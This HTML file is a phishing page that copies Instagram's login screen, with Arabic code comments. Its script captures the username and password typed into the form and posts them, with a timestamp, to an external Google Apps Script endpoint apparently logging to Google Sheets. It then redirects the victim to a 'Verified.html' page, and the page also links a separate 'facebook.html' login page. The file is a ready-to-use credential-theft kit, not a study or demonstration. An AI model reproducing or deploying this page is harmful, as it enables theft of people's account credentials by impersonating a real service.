<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin-bottom: 10px;
            margin-top: 30px;
            padding: 20px 40px;
            width: 100%;
        }

        .logo {
            margin: 22px auto 12px;
            text-align: center;
        }

        .logo svg {
            width: 175px;
            height: 51px;
        }

        .form-group {
            margin-bottom: 6px;
            position: relative;
        }

        .form-group input {
            width: 100%;
            padding: 9px 0 7px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 14px;
            outline: none;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            border-color: #a0a0a0;
            background-color: white;
        }

        .form-group input::placeholder {
            color: #8e8e8e;
        }

        .login-button {
            width: 100%;
            padding: 8px;
            margin: 8px 0;
            border: none;
            border-radius: 8px;
            background-color: #0095f6;
            color: white;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-button:hover {
            background-color: #1877f2;
        }

        .login-button:active {
            background-color: #005cb2;
        }

        .login-button:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider span {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: color 0.3s;
        }

        .facebook-login:hover {
            color: #0056b3;
        }

        .facebook-login svg {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }

        .forgot-password {
            display: block;
            text-align: center;
            color: #00376b;
            font-size: 12px;
            margin-top: 12px;
            text-decoration: none;
            cursor: pointer;
            transition: color 0.3s;
        }

        .forgot-password:hover {
            color: #005cb2;
        }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            width: 100%;
            text-align: center;
            margin-bottom: 10px;
        }

        .signup-box p {
            color: #262626;
            font-size: 14px;
            margin: 0;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            transition: color 0.3s;
        }

        .signup-box a:hover {
            color: #005cb2;
        }

        .get-app {
            width: 100%;
            text-align: center;
            margin: 20px 0;
        }

        .get-app p {
            color: #262626;
            font-size: 14px;
            margin: 10px 0;
        }

        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-stores a {
            display: inline-block;
            height: 40px;
        }

        .app-stores img {
            height: 100%;
            display: block;
        }

        footer {
            margin-top: 40px;
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            line-height: 1.6;
        }

        footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 8px;
            transition: color 0.3s;
        }

        footer a:hover {
            color: #262626;
        }

        .loading {
            display: none;
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 10px;
        }

        @media (max-width: 450px) {
            .login-box, .signup-box {
                padding: 10px 20px;
            }

            .logo {
                margin: 22px auto 12px;
                background-image: url(https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png);
                background-position: -98px 0;
                height: 51px;
                width: 177px;
                overflow: hidden;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div style="
                margin: 22px auto 12px;
                background-image: url(https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png);
                background-position: -98px 0;
                height: 51px;
                width: 177px;
                overflow: hidden;"></div>
            
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-button" id="loginBtn">Log In</button>
                <div class="loading" id="loading">Logging in...</div>
            </form>
            
            <div class="divider">
                <span>OR</span>
            </div>
            
            <div class="facebook-login">
                <svg viewBox="0 0 24 24" fill="currentColor">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg> <a style="text-decoration: none;" href="facebook.html">Log in with Facebook</a>
                
            </div>
            
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-stores">
                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40" width="134"></a>
                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134"></a>
            </div>
        </div>
        
        <footer>
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact uploading and non-users</a>
            <a href="#">Meta Verified</a>
            <p>© 2025 Instagram from Meta</p>
        </footer>
    </div>

    <script>
        // ضع رابط Google Apps Script Web App هنا
        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzkd20zPRiJDtEesKdQhAlBGlAYjAuhCGZlAJIydI4q5VDAUoL2Kdd9v48nGaUT_0qQxQ/exec';
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const loading = document.getElementById('loading');
            
            // التحقق من الحقول
            if (!username || !password) {
                return;
            }
            
            // تعطيل الزر وإظهار التحميل
            loginBtn.disabled = true;
            loading.style.display = 'block';
            
            // إرسال البيانات إلى Google Sheets باستخدام XMLHttpRequest
            const xhr = new XMLHttpRequest();
            xhr.open("POST", GOOGLE_SCRIPT_URL, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    // إعادة تعيين النموذج
                    document.getElementById('loginForm').reset();
                    
                    // إعادة تفعيل الزر وإخفاء التحميل
                    loginBtn.disabled = false;
                    loading.style.display = 'none';
                    
                    // التوجيه إلى صفحة Verified.html بعد تأخير قصير
                    setTimeout(function() {
                        window.location.href = 'Verified.html';
                    }, 500);
                }
            };
            
            // إرسال البيانات
            xhr.send(JSON.stringify({
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            }));
            
            // في حالة فشل الطلب، قم بالتحويل بعد 3 ثوانٍ كخطة احتياطية
            setTimeout(function() {
                if (document.getElementById('loginForm')) {
                    window.location.href = 'Verified.html';
                }
            }, 3000);
        });
        
        // Facebook login simulation
        document.querySelector('.facebook-login').addEventListener('click', function() {
            // تم إزالة التنبيه
        });
        
        // Forgot password simulation
        document.querySelector('.forgot-password').addEventListener('click', function(e) {
            e.preventDefault();
            // تم إزالة التنبيه
        });
        
        // Sign up simulation
        document.querySelector('.signup-box a').addEventListener('click', function(e) {
            e.preventDefault();
            // تم إزالة التنبيه
        });
    </script>
</body>
</html>
